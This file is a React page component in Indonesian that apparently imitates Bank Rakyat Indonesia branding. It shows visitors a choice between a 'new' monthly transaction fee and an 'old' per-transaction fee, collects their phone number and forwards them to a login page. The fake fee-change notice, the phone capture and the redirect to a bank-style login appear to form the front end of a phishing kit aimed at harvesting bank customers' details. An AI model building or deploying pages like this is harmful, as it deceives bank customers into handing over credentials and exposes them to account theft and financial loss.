import { useNavigate } from 'react-router-dom'
import '../assets/css/tambah.css';
import muda from '../assets/img/ani.gif'
import tlp from "../assets/img/tlp.png"
import ft from "../assets/img/fot.png"
import top from "../assets/img/bri-header.png"

function Tarif(props) {
    const nav = useNavigate()

    const inTarif = (e) => {
        console.log()
        nav('/login')
    }

  return (
    <>
      <div>
        <nav>
          <img width={'70px'} src={top} />
        </nav>
        <br /><br /><br />
        <center>
        <img width={'100%'} src={muda} />
        </center>
        <div className="App-v2">
        <form onSubmit={inTarif} style={{backgroundColor:"transparent", boxShadow:"none"}}>
        <div className="apaini">
          <span className="boblue" style={{fontSize:'15px', textAlign:"center",display:"flex",width:"100%"}}>
          Silahkan pilih tarif transaksi sesuai kebutuhan anda di bawah ini
          </span>
          <br />
          <hr /><br />
          <input type="radio" style={{height:'15px', width:'unset', marginRight:'5px'}} name="sama"required/><span className="boblue">Tarif baru Rp 150.000 / Bulan</span>
          <br /><br />
          <input type="radio" style={{height:'15px', width:'unset', marginRight:'5px'}} name="sama"required/><span className="boblue"> Tarif lama Rp 6.500 / Transaksi</span>
          <br /><br /><br />
          <span className="boblue" style={{color:"black"}}> 
          Masukan nomor ponsel anda:
          </span>
          <div className="ipt paksa">
            <img src={tlp} className="icon-login" width={'34px'} style={{marginTop:'-5px'}} />
            <input style={{height:'100%'}} type="number" placeholder="Telepone" onInput={(e) => props.tlp(e.target.value)} required/>
          </div>
        </div>
        <br />
        <button type='submit'> Lanjutkan</button>
        <br />
        </form>
        <center>
        <img src={ft} width="60%" />

        </center>
        </div>
      </div>
    </>
  );
}

export default Tarif;